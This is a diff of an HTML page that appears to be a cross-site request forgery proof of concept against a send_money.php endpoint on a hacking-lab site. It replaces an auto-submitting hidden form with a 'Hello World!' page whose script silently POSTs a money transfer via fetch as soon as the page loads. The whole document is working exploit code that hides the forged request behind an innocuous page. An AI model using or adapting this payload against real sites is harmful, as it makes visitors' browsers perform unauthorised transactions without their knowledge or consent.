@@ -1,18 +1,17 @@
 <!DOCTYPE HTML>  
 <html>
 <body>
-<form action="//labs.hackxpert.com/Testing%20grounds/ComputerSystemsInc/send_money.php" method="POST">
-  <input type="text" name="from_account" id="from_account"/>
-  <input type="text" name="to_account" id="to_account"/>
-  <input type="number" name="amount" id="amount"/>
-  <input type="submit" name="subm" value="Send Money"/> 
-</form>
+Hello World!
 </body>
 <script>
-form1 = document.forms[0]
-form1.elements['from_account'].value = "foo";
-form1.elements['to_account'].value = "bar";
-form1.elements['amount'].value = 1;
-form1.submit();
+let formData = new FormData();
+formData.append("from_account", "foo");
+formData.append("to_account", "bar");
+formData.append("amount", 1);
+formData.append("submit", "Send Money");
+fetch("https://labs.hackxpert.com/Testing%20grounds/ComputerSystemsInc/send_money.php", {
+  method: 'POST',
+  body: formData
+});
 </script>
 </html>
